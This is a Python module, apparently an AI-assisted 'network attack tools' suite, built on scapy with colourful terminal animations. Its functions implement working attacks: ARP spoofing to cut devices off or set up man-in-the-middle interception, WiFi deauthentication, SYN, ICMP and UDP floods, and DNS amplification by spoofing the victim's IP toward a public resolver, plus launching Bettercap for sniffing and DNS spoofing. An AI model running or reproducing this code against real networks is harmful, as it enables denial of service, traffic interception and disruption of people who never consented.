"""Advanced Network Tools Module with Animations and Styling"""

import threading
import time
import random
import subprocess
import socket
import os
import sys
from datetime import datetime
from scapy.all import *
from colorama import Fore, Style, init

# Initialize colorama
init()

# Animation characters
ANIMATION_CHARS = ['⚡', '🔥', '💀', '⚔️', '🎯', '🌐', '📡', '🔓', '🛡️', '⚡']
NETWORK_ICONS = ['🖥️', '💻', '📱', '🌐', '📡', '🔌', '📶', '🛰️']
ATTACK_ICONS = ['💥', '⚡', '🔥', '💀', '⚔️', '🎯']

class NetworkVisualizer:
    """Handles visual animations and styling for network operations"""
    
    def __init__(self, log_callback):
        self.log = log_callback
        self.animation_active = False
        self.animation_thread = None
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def animate_attack(self, target_ip, attack_type, duration=5):
        """Show animated attack visualization"""
        def animate():
            self.animation_active = True
            start_time = time.time()
            
            while self.animation_active and time.time() - start_time < duration:
                # Random attack animation
                icon = random.choice(ATTACK_ICONS)
                intensity = random.randint(1, 5)
                red_intensity = min(255, 100 + intensity * 30)
                
                # Create animated attack line
                attack_line = f"{Fore.RED}{'█' * intensity} {icon} ATTACKING {target_ip} {icon} {'█' * intensity}{Fore.RESET}"
                self.log(attack_line)
                
                # Network device animation
                device_icon = random.choice(NETWORK_ICONS)
                status_line = f"{Fore.CYAN}[{device_icon}] {attack_type.upper()} → {target_ip}{Fore.RESET}"
                self.log(status_line)
                
                time.sleep(0.2)
            
            self.animation_active = False
        
        if self.animation_thread and self.animation_thread.is_alive():
            self.animation_active = False
            self.animation_thread.join()
            
        self.animation_thread = threading.Thread(target=animate, daemon=True)
        self.animation_thread.start()
    
    def show_network_map(self, devices):
        """Display animated network map"""
        self.log(f"{Fore.CYAN}{'='*60}{Fore.RESET}")
        self.log(f"{Fore.YELLOW}🌐 NETWORK TOPOLOGY MAP 🌐{Fore.RESET}")
        self.log(f"{Fore.CYAN}{'='*60}{Fore.RESET}")
        
        for i, device in enumerate(devices):
            icon = random.choice(NETWORK_ICONS)
            status = "🟢 ONLINE" if device.get('status', True) else "🔴 OFFLINE"
            self.log(f"{Fore.GREEN}[{icon}] Device {i+1}: {device.get('ip', 'Unknown')} - {status}{Fore.RESET}")
            
            # Connection lines
            if i < len(devices) - 1:
                self.log(f"{Fore.WHITE}    │{Fore.RESET}")
                self.log(f"{Fore.WHITE}    └── 📡 Connection{Fore.RESET}")
        
        self.log(f"{Fore.CYAN}{'='*60}{Fore.RESET}")
    
    def show_attack_status(self, attack_name, target, status, progress=0):
        """Show animated attack status"""
        progress_bar = "█" * (progress // 10) + "░" * (10 - progress // 10)
        
        if status == "RUNNING":
            color = Fore.RED
            icon = random.choice(ATTACK_ICONS)
        elif status == "COMPLETED":
            color = Fore.GREEN
            icon = "✅"
        else:
            color = Fore.YELLOW
            icon = "⏳"
        
        status_line = f"{color}[{icon}] {attack_name} → {target} [{progress_bar}] {progress}%{Fore.RESET}"
        self.log(status_line)
    
    def show_banner(self):
        """Display animated banner"""
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗{Fore.RESET}
{Fore.RED}║{Fore.RESET} {Fore.CYAN}🔥 ADVANCED NETWORK ATTACK TOOLS 🔥{Fore.RESET} {Fore.RED}║{Fore.RESET}
{Fore.RED}║{Fore.RESET} {Fore.YELLOW}⚡ Powered by Cascade AI ⚡{Fore.RESET} {Fore.RED}║{Fore.RESET}
{Fore.RED}║{Fore.RESET} {Fore.GREEN}🛡️ Professional Network Security Suite 🛡️{Fore.RESET} {Fore.RED}║{Fore.RESET}
{Fore.RED}╚══════════════════════════════════════════════════════════════╝{Fore.RESET}
        """
        self.log(banner)
    
    def typing_effect(self, text, delay=0.03):
        """Show typing animation for text"""
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()

class AdvancedNetworkTools:
    """Advanced network attack and defense tools with animations and styling"""
    
    def __init__(self, log_callback):
        self.log = log_callback
        self.blocked_devices = set()
        self.active_attacks = {}
        self.visualizer = NetworkVisualizer(log_callback)
        self.attack_stats = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'packets_sent': 0
        }
        
        # Show banner on initialization
        self.visualizer.show_banner()
        
    def block_device(self, target_ip, gateway_ip):
        """Block device from network using ARP spoofing with animations"""
        def spoof():
            self.visualizer.animate_attack(target_ip, "DEVICE BLOCK", 3)
            self.log(f"{Fore.RED}🔥 [BLOCKING] Isolating {target_ip} from network... 🔥{Fore.RESET}")
            packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                        psrc=gateway_ip)
            try:
                packets_sent = 0
                while target_ip in self.blocked_devices:
                    send(packet, verbose=0, inter=0.5)
                    packets_sent += 1
                    
                    # Show progress animation
                    if packets_sent % 10 == 0:
                        self.visualizer.show_attack_status("DEVICE BLOCK", target_ip, "RUNNING", min(100, packets_sent // 2))
                        
                self.log(f"{Fore.GREEN}✅ [+] Device {target_ip} unblocked - {packets_sent} packets sent{Fore.RESET}")
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['packets_sent'] += packets_sent
            except Exception as e:
                self.log(f"{Fore.RED}💥 [-] Block failed: {e}{Fore.RESET}")
                self.attack_stats['failed_attacks'] += 1
        
        self.attack_stats['total_attacks'] += 1
        self.blocked_devices.add(target_ip)
        self.visualizer.show_attack_status("DEVICE BLOCK", target_ip, "INITIALIZING", 0)
        threading.Thread(target=spoof, daemon=True).start()
        
    def unblock_device(self, target_ip):
        """Unblock device with animation"""
        if target_ip in self.blocked_devices:
            self.blocked_devices.remove(target_ip)
            self.log(f"{Fore.GREEN}🛡️ [+] Unblocking {target_ip} - Device restored to network 🛡️{Fore.RESET}")
            self.visualizer.show_attack_status("DEVICE UNBLOCK", target_ip, "COMPLETED", 100)
    
    def deauth_attack(self, target_mac, gateway_mac, interface="wlan0"):
        """WiFi deauthentication attack with animations"""
        self.visualizer.animate_attack(target_mac, "DEAUTH ATTACK", 3)
        self.log(f"{Fore.YELLOW}📡 [DEAUTH] Starting deauth attack on {target_mac}... 📡{Fore.RESET}")
        
        def deauth():
            try:
                # Create deauth packet
                packet = RadioTap()/Dot11(type=0, subtype=12, 
                                         addr1=target_mac, addr2=gateway_mac, 
                                         addr3=gateway_mac)/Dot11Deauth(reason=7)
                # Send 100 deauth packets with animation
                for i in range(100):
                    sendp(packet, iface=interface, verbose=0)
                    time.sleep(0.1)
                    
                    # Show animated progress
                    if i % 10 == 0:
                        progress = (i / 100) * 100
                        self.visualizer.show_attack_status("DEAUTH ATTACK", target_mac, "RUNNING", int(progress))
                        icon = random.choice(ATTACK_ICONS)
                        self.log(f"{Fore.RED}{icon} [DEAUTH] Sent {i} packets - Jamming WiFi signal... {icon}{Fore.RESET}")
                        
                self.log(f"{Fore.GREEN}✅ [+] Deauth attack completed - Target disconnected from WiFi{Fore.RESET}")
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['packets_sent'] += 100
            except Exception as e:
                self.log(f"{Fore.RED}💥 [-] Deauth failed: {e}{Fore.RESET}")
                self.attack_stats['failed_attacks'] += 1
        
        self.attack_stats['total_attacks'] += 1
        self.visualizer.show_attack_status("DEAUTH ATTACK", target_mac, "INITIALIZING", 0)
        threading.Thread(target=deauth, daemon=True).start()
    
    def syn_flood(self, target_ip, target_port=80, duration=10):
        """SYN flood DDoS attack with animations and red styling"""
        self.visualizer.animate_attack(target_ip, "SYN FLOOD", 3)
        self.log(f"{Fore.RED}⚡ [DDOS] SYN Flood → {target_ip}:{target_port} for {duration}s ⚡{Fore.RESET}")
        attack_id = f"syn_{target_ip}_{time.time()}"
        self.active_attacks[attack_id] = True
        
        def flood():
            end_time = time.time() + duration
            packets_sent = 0
            start_time = time.time()
            
            try:
                while time.time() < end_time and self.active_attacks.get(attack_id, False):
                    # Random source port
                    src_port = random.randint(1024, 65535)
                    # Create SYN packet
                    packet = IP(dst=target_ip)/TCP(sport=src_port, dport=target_port, 
                                                   flags="S", seq=random.randint(0, 999999))
                    send(packet, verbose=0)
                    packets_sent += 1
                    
                    # Show animated progress with red attack styling
                    if packets_sent % 50 == 0:
                        elapsed_time = time.time() - start_time
                        progress = min(100, (elapsed_time / duration) * 100)
                        self.visualizer.show_attack_status("SYN FLOOD", f"{target_ip}:{target_port}", "RUNNING", int(progress))
                        
                        # Red attack animation
                        intensity = min(10, packets_sent // 100)
                        red_bar = f"{Fore.RED}{'█' * intensity}{'░' * (10 - intensity)}{Fore.RESET}"
                        icon = random.choice(ATTACK_ICONS)
                        self.log(f"{Fore.RED}{icon} [SYN FLOOD] {packets_sent} packets sent - Rate: {packets_sent/max(1, elapsed_time):.1f} pps {red_bar} {icon}{Fore.RESET}")
                        
                self.log(f"{Fore.GREEN}✅ [+] SYN Flood complete: {packets_sent} packets sent in {elapsed_time:.1f}s{Fore.RESET}")
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['packets_sent'] += packets_sent
            except Exception as e:
                self.log(f"{Fore.RED}💥 [-] SYN Flood failed: {e}{Fore.RESET}")
                self.attack_stats['failed_attacks'] += 1
            finally:
                if attack_id in self.active_attacks:
                    del self.active_attacks[attack_id]
        
        self.attack_stats['total_attacks'] += 1
        self.visualizer.show_attack_status("SYN FLOOD", f"{target_ip}:{target_port}", "INITIALIZING", 0)
        threading.Thread(target=flood, daemon=True).start()
        return attack_id
    
    def icmp_flood(self, target_ip, duration=10):
        """ICMP flood attack (Ping flood) with animations"""
        self.visualizer.animate_attack(target_ip, "ICMP FLOOD", 3)
        self.log(f"{Fore.RED}💥 [DDOS] ICMP Flood → {target_ip} for {duration}s 💥{Fore.RESET}")
        attack_id = f"icmp_{target_ip}_{time.time()}"
        self.active_attacks[attack_id] = True
        
        def flood():
            end_time = time.time() + duration
            packets_sent = 0
            start_time = time.time()
            
            try:
                while time.time() < end_time and self.active_attacks.get(attack_id, False):
                    # Create ICMP packet with random payload size
                    payload_size = random.randint(64, 1024)
                    packet = IP(dst=target_ip)/ICMP()/"X"*payload_size
                    send(packet, verbose=0)
                    packets_sent += 1
                    
                    # Show animated progress
                    if packets_sent % 50 == 0:
                        elapsed_time = time.time() - start_time
                        progress = min(100, (elapsed_time / duration) * 100)
                        self.visualizer.show_attack_status("ICMP FLOOD", target_ip, "RUNNING", int(progress))
                        
                        # Red attack animation with ping effect
                        intensity = min(10, packets_sent // 100)
                        red_bar = f"{Fore.RED}{'█' * intensity}{'░' * (10 - intensity)}{Fore.RESET}"
                        icon = random.choice(ATTACK_ICONS)
                        self.log(f"{Fore.RED}{icon} [ICMP FLOOD] {packets_sent} pings sent - Size: {payload_size}B {red_bar} {icon}{Fore.RESET}")
                        
                self.log(f"{Fore.GREEN}✅ [+] ICMP Flood complete: {packets_sent} packets sent in {elapsed_time:.1f}s{Fore.RESET}")
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['packets_sent'] += packets_sent
            except Exception as e:
                self.log(f"{Fore.RED}💥 [-] ICMP Flood failed: {e}{Fore.RESET}")
                self.attack_stats['failed_attacks'] += 1
            finally:
                if attack_id in self.active_attacks:
                    del self.active_attacks[attack_id]
        
        self.attack_stats['total_attacks'] += 1
        self.visualizer.show_attack_status("ICMP FLOOD", target_ip, "INITIALIZING", 0)
        threading.Thread(target=flood, daemon=True).start()
        return attack_id
    
    def udp_flood(self, target_ip, target_port=80, duration=10):
        """UDP flood attack with animations and red styling"""
        self.visualizer.animate_attack(target_ip, "UDP FLOOD", 3)
        self.log(f"{Fore.RED}🌊 [DDOS] UDP Flood → {target_ip}:{target_port} for {duration}s 🌊{Fore.RESET}")
        attack_id = f"udp_{target_ip}_{time.time()}"
        self.active_attacks[attack_id] = True
        
        def flood():
            end_time = time.time() + duration
            packets_sent = 0
            start_time = time.time()
            
            try:
                while time.time() < end_time and self.active_attacks.get(attack_id, False):
                    # Random source and payload
                    src_port = random.randint(1024, 65535)
                    payload = random._urandom(random.randint(64, 512))
                    packet = IP(dst=target_ip)/UDP(sport=src_port, dport=target_port)/payload
                    send(packet, verbose=0)
                    packets_sent += 1
                    
                    # Show animated progress
                    if packets_sent % 50 == 0:
                        elapsed_time = time.time() - start_time
                        progress = min(100, (elapsed_time / duration) * 100)
                        self.visualizer.show_attack_status("UDP FLOOD", f"{target_ip}:{target_port}", "RUNNING", int(progress))
                        
                        # Red attack animation with wave effect
                        intensity = min(10, packets_sent // 100)
                        red_bar = f"{Fore.RED}{'█' * intensity}{'░' * (10 - intensity)}{Fore.RESET}"
                        icon = random.choice(ATTACK_ICONS)
                        self.log(f"{Fore.RED}{icon} [UDP FLOOD] {packets_sent} packets sent - Port: {target_port} {red_bar} {icon}{Fore.RESET}")
                        
                self.log(f"{Fore.GREEN}✅ [+] UDP Flood complete: {packets_sent} packets sent in {elapsed_time:.1f}s{Fore.RESET}")
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['packets_sent'] += packets_sent
            except Exception as e:
                self.log(f"{Fore.RED}💥 [-] UDP Flood failed: {e}{Fore.RESET}")
                self.attack_stats['failed_attacks'] += 1
            finally:
                if attack_id in self.active_attacks:
                    del self.active_attacks[attack_id]
        
        self.attack_stats['total_attacks'] += 1
        self.visualizer.show_attack_status("UDP FLOOD", f"{target_ip}:{target_port}", "INITIALIZING", 0)
        threading.Thread(target=flood, daemon=True).start()
        return attack_id
    
    def dns_amplification(self, target_ip, dns_server="8.8.8.8", duration=10):
        """DNS amplification attack with animations"""
        self.visualizer.animate_attack(target_ip, "DNS AMPLIFICATION", 3)
        self.log(f"{Fore.RED}🔄 [DDOS] DNS Amplification → {target_ip} via {dns_server} 🔄{Fore.RESET}")
        
        def amplify():
            end_time = time.time() + duration
            packets_sent = 0
            start_time = time.time()
            
            try:
                while time.time() < end_time:
                    # Spoof source IP as target (reflection)
                    packet = IP(src=target_ip, dst=dns_server)/UDP(dport=53)/DNS(
                        rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
                    send(packet, verbose=0)
                    packets_sent += 1
                    
                    # Show animated progress
                    if packets_sent % 25 == 0:
                        elapsed_time = time.time() - start_time
                        progress = min(100, (elapsed_time / duration) * 100)
                        self.visualizer.show_attack_status("DNS AMP", f"{target_ip}←{dns_server}", "RUNNING", int(progress))
                        
                        # Red attack animation with reflection effect
                        intensity = min(10, packets_sent // 50)
                        red_bar = f"{Fore.RED}{'█' * intensity}{'░' * (10 - intensity)}{Fore.RESET}"
                        icon = random.choice(ATTACK_ICONS)
                        self.log(f"{Fore.RED}{icon} [DNS AMP] {packets_sent} queries reflected - Amplification active {red_bar} {icon}{Fore.RESET}")
                        
                self.log(f"{Fore.GREEN}✅ [+] DNS Amplification complete: {packets_sent} queries sent in {elapsed_time:.1f}s{Fore.RESET}")
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['packets_sent'] += packets_sent
            except Exception as e:
                self.log(f"{Fore.RED}💥 [-] DNS Amplification failed: {e}{Fore.RESET}")
                self.attack_stats['failed_attacks'] += 1
        
        self.attack_stats['total_attacks'] += 1
        self.visualizer.show_attack_status("DNS AMP", f"{target_ip}←{dns_server}", "INITIALIZING", 0)
        threading.Thread(target=amplify, daemon=True).start()
    
    def arp_spoof(self, target_ip, gateway_ip):
        """ARP spoofing for MITM attack with animations"""
        self.visualizer.animate_attack(target_ip, "ARP SPOOF", 3)
        self.log(f"{Fore.YELLOW}🎭 [ARP SPOOF] Starting MITM between {target_ip} and {gateway_ip} 🎭{Fore.RESET}")
        
        def get_mac(ip):
            """Get MAC address of IP"""
            ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            return None
        
        def spoof():
            try:
                target_mac = get_mac(target_ip)
                gateway_mac = get_mac(gateway_ip)
                
                if not target_mac or not gateway_mac:
                    self.log(f"{Fore.RED}💥 [-] Could not get MAC addresses{Fore.RESET}")
                    return
                
                # Enable IP forwarding
                subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
                
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                
                self.log(f"{Fore.GREEN}🎭 [+] ARP Spoofing active - Man-in-the-Middle established 🎭{Fore.RESET}")
                
                packets_sent = 0
                while True:
                    send(packet1, verbose=0)
                    send(packet2, verbose=0)
                    packets_sent += 2
                    time.sleep(2)
                    
                    # Show animated MITM status
                    if packets_sent % 10 == 0:
                        self.visualizer.show_attack_status("ARP MITM", f"{target_ip}↔{gateway_ip}", "RUNNING", 75)
                        icon = random.choice(ATTACK_ICONS)
                        self.log(f"{Fore.YELLOW}{icon} [MITM] Intercepting traffic - {packets_sent} packets sent {icon}{Fore.RESET}")
                        
            except KeyboardInterrupt:
                self.log(f"{Fore.YELLOW}⚠️ [!] Stopping ARP spoof - Restoring network ⚠️{Fore.RESET}")
                # Restore ARP tables
                subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
                self.visualizer.show_attack_status("ARP MITM", f"{target_ip}↔{gateway_ip}", "STOPPED", 0)
            except Exception as e:
                self.log(f"{Fore.RED}💥 [-] ARP Spoof failed: {e}{Fore.RESET}")
                self.attack_stats['failed_attacks'] += 1
        
        self.attack_stats['total_attacks'] += 1
        self.visualizer.show_attack_status("ARP MITM", f"{target_ip}↔{gateway_ip}", "INITIALIZING", 0)
        threading.Thread(target=spoof, daemon=True).start()
    
    def stop_attack(self, attack_id):
        """Stop a specific attack with animation"""
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id] = False
            self.log(f"{Fore.YELLOW}🛑 [!] Stopping attack {attack_id} - Attack terminated 🛑{Fore.RESET}")
            self.visualizer.show_attack_status("ATTACK STOP", attack_id, "STOPPED", 0)
    
    def stop_all_attacks(self):
        """Stop all active attacks with animation"""
        stopped_count = len(self.active_attacks)
        for attack_id in list(self.active_attacks.keys()):
            self.active_attacks[attack_id] = False
        self.log(f"{Fore.YELLOW}🛑 [!] All {stopped_count} attacks stopped - Network restored 🛑{Fore.RESET}")
        self.visualizer.show_attack_status("ALL ATTACKS", "NETWORK", "STOPPED", 0)
    
    def show_attack_stats(self):
        """Display attack statistics with styling"""
        stats = self.attack_stats
        success_rate = (stats['successful_attacks'] / max(1, stats['total_attacks'])) * 100
        
        self.log(f"{Fore.CYAN}{'='*50}{Fore.RESET}")
        self.log(f"{Fore.YELLOW}📊 ATTACK STATISTICS 📊{Fore.RESET}")
        self.log(f"{Fore.CYAN}{'='*50}{Fore.RESET}")
        self.log(f"{Fore.GREEN}✅ Total Attacks: {stats['total_attacks']}{Fore.RESET}")
        self.log(f"{Fore.GREEN}✅ Successful: {stats['successful_attacks']}{Fore.RESET}")
        self.log(f"{Fore.RED}💥 Failed: {stats['failed_attacks']}{Fore.RESET}")
        self.log(f"{Fore.CYAN}📦 Packets Sent: {stats['packets_sent']:,}{Fore.RESET}")
        self.log(f"{Fore.YELLOW}📈 Success Rate: {success_rate:.1f}%{Fore.RESET}")
        self.log(f"{Fore.CYAN}{'='*50}{Fore.RESET}")


class BettercapIntegration:
    """Bettercap integration for advanced attacks with animations"""
    
    def __init__(self, log_callback):
        self.log = log_callback
        self.bettercap_process = None
        self.is_running = False
        self.visualizer = NetworkVisualizer(log_callback)
        
    def is_installed(self):
        """Check if bettercap is installed with animation"""
        self.visualizer.show_attack_status("BETTERCAP CHECK", "SYSTEM", "RUNNING", 50)
        try:
            result = subprocess.run(["which", "bettercap"], capture_output=True, text=True)
            if result.returncode == 0:
                self.log(f"{Fore.GREEN}✅ [+] Bettercap is installed on system{Fore.RESET}")
                self.visualizer.show_attack_status("BETTERCAP CHECK", "SYSTEM", "COMPLETED", 100)
                return True
            else:
                self.log(f"{Fore.RED}💥 [-] Bettercap not found - Installation required{Fore.RESET}")
                self.visualizer.show_attack_status("BETTERCAP CHECK", "SYSTEM", "FAILED", 0)
                return False
        except:
            self.log(f"{Fore.RED}💥 [-] Error checking Bettercap installation{Fore.RESET}")
            return False
    
    def install_bettercap(self):
        """Install bettercap with animations"""
        self.visualizer.animate_attack("SYSTEM", "BETTERCAP INSTALL", 3)
        self.log(f"{Fore.YELLOW}📦 [BETTERCAP] Installing Bettercap... 📦{Fore.RESET}")
        
        try:
            commands = [
                "apt-get update",
                "apt-get install -y bettercap"
            ]
            
            for i, cmd in enumerate(commands):
                self.visualizer.show_attack_status("BETTERCAP INSTALL", "SYSTEM", "RUNNING", (i + 1) * 50)
                self.log(f"{Fore.CYAN}🔄 [+] Running: {cmd}{Fore.RESET}")
                subprocess.run(f"sudo {cmd}", shell=True)
                
            self.log(f"{Fore.GREEN}✅ [+] Bettercap installation completed successfully{Fore.RESET}")
            self.visualizer.show_attack_status("BETTERCAP INSTALL", "SYSTEM", "COMPLETED", 100)
            
        except Exception as e:
            self.log(f"{Fore.RED}💥 [-] Bettercap installation failed: {e}{Fore.RESET}")
            self.visualizer.show_attack_status("BETTERCAP INSTALL", "SYSTEM", "FAILED", 0)
    
    def start_bettercap(self, interface="eth0"):
        """Start Bettercap with web UI and animations"""
        if not self.is_installed():
            self.install_bettercap()
            
        self.visualizer.animate_attack(interface, "BETTERCAP START", 3)
        self.log(f"{Fore.CYAN}🌐 [BETTERCAP] Starting on {interface}... 🌐{Fore.RESET}")
        
        try:
            # Start with web UI on port 8080
            cmd = f"sudo bettercap -iface {interface} -caplet http-ui"
            self.visualizer.show_attack_status("BETTERCAP START", interface, "RUNNING", 50)
            self.log(f"{Fore.YELLOW}🚀 [+] Launching Bettercap with web interface...{Fore.RESET}")
            
            self.bettercap_process = subprocess.Popen(cmd, shell=True, 
                                                     stdout=subprocess.PIPE, 
                                                     stderr=subprocess.PIPE)
            self.is_running = True
            
            self.log(f"{Fore.GREEN}✅ [+] Bettercap started successfully{Fore.RESET}")
            self.log(f"{Fore.CYAN}🌐 Web UI: http://127.0.0.1:8080{Fore.RESET}")
            self.log(f"{Fore.YELLOW}🔑 Credentials: user / pass{Fore.RESET}")
            self.visualizer.show_attack_status("BETTERCAP START", interface, "COMPLETED", 100)
            
        except Exception as e:
            self.log(f"{Fore.RED}💥 [-] Bettercap failed to start: {e}{Fore.RESET}")
            self.visualizer.show_attack_status("BETTERCAP START", interface, "FAILED", 0)
    
    def stop_bettercap(self):
        """Stop Bettercap with animation"""
        if self.bettercap_process:
            self.visualizer.animate_attack("BETTERCAP", "STOP SERVICE", 2)
            self.log(f"{Fore.YELLOW}🛑 [!] Stopping Bettercap service... 🛑{Fore.RESET}")
            self.bettercap_process.terminate()
            self.is_running = False
            self.log(f"{Fore.GREEN}✅ [+] Bettercap stopped successfully{Fore.RESET}")
            self.visualizer.show_attack_status("BETTERCAP STOP", "SERVICE", "COMPLETED", 100)
    
    def run_command(self, command):
        """Run a bettercap command with animation"""
        if not self.is_running:
            self.log(f"{Fore.RED}💥 [-] Bettercap not running - Start it first{Fore.RESET}")
            return
            
        self.visualizer.animate_attack("BETTERCAP", f"CMD: {command}", 2)
        self.log(f"{Fore.CYAN}⚡ [BETTERCAP] Executing: {command} ⚡{Fore.RESET}")
        self.visualizer.show_attack_status("BETTERCAP CMD", command, "RUNNING", 75)
        
        # This would normally interact with bettercap's API
        # For now, we'll just log the command with animation
        self.log(f"{Fore.GREEN}✅ [+] Command executed successfully{Fore.RESET}")
        self.visualizer.show_attack_status("BETTERCAP CMD", command, "COMPLETED", 100)
    
    def start_sniffing(self):
        """Start packet sniffing with animation"""
        self.visualizer.animate_attack("NETWORK", "PACKET SNIFF", 2)
        self.log(f"{Fore.YELLOW}👂 [+] Starting packet sniffing... 👂{Fore.RESET}")
        self.run_command("net.sniff on")
    
    def start_probe(self):
        """Start network probe with animation"""
        self.visualizer.animate_attack("NETWORK", "PROBE SCAN", 2)
        self.log(f"{Fore.CYAN}🔍 [+] Starting network probe... 🔍{Fore.RESET}")
        self.run_command("net.probe on")
    
    def start_arp_spoof(self):
        """Start ARP spoofing with animation"""
        self.visualizer.animate_attack("NETWORK", "ARP SPOOF", 2)
        self.log(f"{Fore.RED}🎭 [+] Starting ARP spoofing... 🎭{Fore.RESET}")
        self.run_command("arp.spoof on")
    
    def start_dns_spoof(self):
        """Start DNS spoofing with animation"""
        self.visualizer.animate_attack("NETWORK", "DNS SPOOF", 2)
        self.log(f"{Fore.RED}🌐 [+] Starting DNS spoofing... 🌐{Fore.RESET}")
        self.run_command("dns.spoof on")
    
    def get_targets(self):
        """Get discovered targets with animation"""
        self.visualizer.animate_attack("NETWORK", "TARGET DISCOVERY", 2)
        self.log(f"{Fore.CYAN}🎯 [+] Discovering network targets... 🎯{Fore.RESET}")
        self.run_command("net.show")
    
    def show_bettercap_status(self):
        """Show Bettercap status with styling"""
        status = "🟢 RUNNING" if self.is_running else "🔴 STOPPED"
        self.log(f"{Fore.CYAN}{'='*40}{Fore.RESET}")
        self.log(f"{Fore.YELLOW}📊 BETTERCAP STATUS 📊{Fore.RESET}")
        self.log(f"{Fore.CYAN}{'='*40}{Fore.RESET}")
        self.log(f"{Fore.GREEN}Status: {status}{Fore.RESET}")
        self.log(f"{Fore.CYAN}Process: {'Active' if self.bettercap_process else 'Inactive'}{Fore.RESET}")
        self.log(f"{Fore.YELLOW}Web UI: http://127.0.0.1:8080{Fore.RESET}")
        self.log(f"{Fore.CYAN}{'='*40}{Fore.RESET}")
